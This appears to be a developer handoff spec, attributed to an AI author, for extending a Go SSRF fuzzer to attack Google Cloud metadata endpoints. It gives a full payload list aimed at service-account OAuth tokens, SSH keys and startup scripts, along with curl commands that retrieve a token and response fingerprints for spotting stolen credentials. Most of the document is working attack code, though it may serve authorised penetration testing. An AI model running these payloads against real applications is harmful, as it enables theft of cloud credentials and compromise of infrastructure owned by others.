# Handoff: SSRF GCP Metadata Service with Metadata-Flavor Header

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: HIGH
**Estimated Effort**: Low-Medium (45-60 minutes)
**Target Files**:
- `tools/go-ssrf-fuzzer/main.go`
- `tools/go-ssrf-fuzzer/fuzzer/fuzzer.go`

---

## 1. Problem Statement

Google Cloud Platform (GCP) Compute Engine instances require the `Metadata-Flavor: Google` header to access the metadata service. Without this header, requests return `403 Forbidden`.

### Current State

From `go-ssrf-fuzzer/main.go`:
```go
if *includeCloud {
    payloads = append(payloads, []string{
        // ...
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        // ...
    }...)
}
```

**Problem**: These payloads are sent as simple GET requests without the required header, so they will **always fail** on real GCP instances.

### GCP Metadata API Requirement

```
GET http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
→ Returns: Metadata

Without header:
→ Returns: 403 Forbidden
```

---

## 2. Implementation Details

### 2.1 Update `main.go` - Add GCP Endpoints with Header Requirement

```go
// Add new flag for GCP-specific behavior
gcpMetadata := flag.Bool("gcp", true, "Include GCP metadata endpoints with required headers")
```

### 2.2 Create GCP Payload Structure

In `fuzzer/fuzzer.go`, add:

```go
// GCPMetadataPayloads returns GCP metadata endpoints with required header
func GCPMetadataPayloads() []PayloadWithHeaders {
    endpoints := []string{
        // Basic metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",

        // Instance metadata
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://metadata.google.internal/computeMetadata/v1/instance/zone",
        "http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
        "http://metadata.google.internal/computeMetadata/v1/instance/name",
        "http://metadata.google.internal/computeMetadata/v1/instance/tags",

        // Network info
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip",
        "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip",

        // Service accounts (CRITICAL - OAuth tokens)
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", // CRITICAL: OAuth token

        // Attributes (custom metadata)
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",

        // Project-wide metadata
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",

        // Alternative hostnames (some environments)
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata/computeMetadata/v1/",
    }

    var payloads []PayloadWithHeaders
    for _, endpoint := range endpoints {
        payloads = append(payloads, PayloadWithHeaders{
            URL: endpoint,
            Headers: map[string]string{
                "Metadata-Flavor": "Google",
            },
        })
    }

    return payloads
}
```

### 2.3 Add GCP Detection Fingerprints

```go
func (f *Fuzzer) IsGCPMetadata(body string) bool {
    fingerprints := []string{
        "computeMetadata",
        "projects/",
        "zones/",
        "machineTypes/",
        "service-accounts",
        "access_token",  // OAuth token response
        "token_type",    // OAuth token response
        "expires_in",    // OAuth token response
        "google.internal",
        "gserviceaccount.com",
    }

    for _, fp := range fingerprints {
        if strings.Contains(body, fp) {
            return true
        }
    }
    return false
}
```

### 2.4 Update Run Function

```go
func Run(config Config) Result {
    f := &Fuzzer{config: config}
    result := Result{
        Hits:      []Hit{},
        StartTime: time.Now(),
    }

    // ================================================================
    // GCP Metadata Testing (with required header)
    // ================================================================
    if config.IncludeGCP {
        gcpPayloads := GCPMetadataPayloads()

        for _, p := range gcpPayloads {
            hit := f.TestPayloadWithHeaders(p.URL, p.Headers)
            if hit != nil {
                // Determine severity based on endpoint
                if strings.Contains(p.URL, "/token") {
                    hit.Severity = "CRITICAL"
                    hit.Reason = "GCP OAuth Token Accessible via SSRF"
                } else if strings.Contains(p.URL, "service-accounts") {
                    hit.Severity = "HIGH"
                    hit.Reason = "GCP Service Account Info Accessible"
                } else if strings.Contains(p.URL, "ssh-keys") {
                    hit.Severity = "HIGH"
                    hit.Reason = "GCP SSH Keys Accessible"
                } else {
                    hit.Severity = "MEDIUM"
                    hit.Reason = "GCP Metadata Accessible"
                }
                result.Hits = append(result.Hits, *hit)
            }
        }
    }

    // ... rest of the function ...
}
```

### 2.5 Update Config Struct

```go
type Config struct {
    URL           string
    Payloads      []string
    Concurrency   int
    Timeout       time.Duration
    Headers       map[string]string
    OOBURL        string
    AttemptIMDSv2 bool
    IncludeGCP    bool  // NEW: Include GCP metadata tests
}
```

### 2.6 Update `main.go`

```go
// Pass flag to config
config := fuzzer.Config{
    // ... existing fields ...
    IncludeGCP: *gcpMetadata,
}
```

---

## 3. GCP OAuth Token Response Format

When the `/token` endpoint is accessible, the response looks like:

```json
{
  "access_token": "ya29.c.Ko8B...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**This is a CRITICAL finding** because:
1. The token can be used to access GCP APIs
2. Token inherits all permissions of the service account
3. Can lead to full cloud infrastructure compromise

---

## 4. Testing

### Manual Test on GCP Instance

```bash
# Without header (fails)
curl http://metadata.google.internal/computeMetadata/v1/
# Response: 403 Forbidden

# With header (succeeds)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
# Response: instance metadata listing

# Get OAuth token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Response: {"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}
```

### Test the Fuzzer

```bash
cd tools/go-ssrf-fuzzer
go build -o go-ssrf-fuzzer .

./go-ssrf-fuzzer -u "http://vulnerable.app/?url=FUZZ" -gcp
```

---

## 5. Detection Fingerprints Table

| Fingerprint | Meaning | Severity |
|-------------|---------|----------|
| `access_token` | OAuth token exposed | CRITICAL |
| `ya29.` | Google OAuth token prefix | CRITICAL |
| `gserviceaccount.com` | Service account email | HIGH |
| `ssh-keys` | SSH keys accessible | HIGH |
| `startup-script` | Startup scripts accessible | HIGH |
| `project-id` | Project ID exposed | MEDIUM |
| `instance/name` | Instance name exposed | LOW |

---

## 6. Verification Checklist

- [ ] `main.go` has `-gcp` flag
- [ ] `GCPMetadataPayloads()` returns 20+ endpoints
- [ ] Each payload includes `Metadata-Flavor: Google` header
- [ ] OAuth token endpoint is tested
- [ ] Build succeeds: `go build -o go-ssrf-fuzzer .`
- [ ] GCP fingerprints detect metadata responses

---

## 7. Alternative GCP Hostnames

Some environments may use different hostnames:

| Hostname | Environment |
|----------|-------------|
| `metadata.google.internal` | Standard GCE |
| `169.254.169.254` | Some configurations |
| `metadata` | Short form (may work) |

All should be tested with the `Metadata-Flavor: Google` header.

---

## 8. Success Criteria

1. Fuzzer sends `Metadata-Flavor: Google` header with all GCP endpoints
2. OAuth tokens are detected as CRITICAL findings
3. Service account information is properly categorized
4. False positives are minimized by checking specific fingerprints

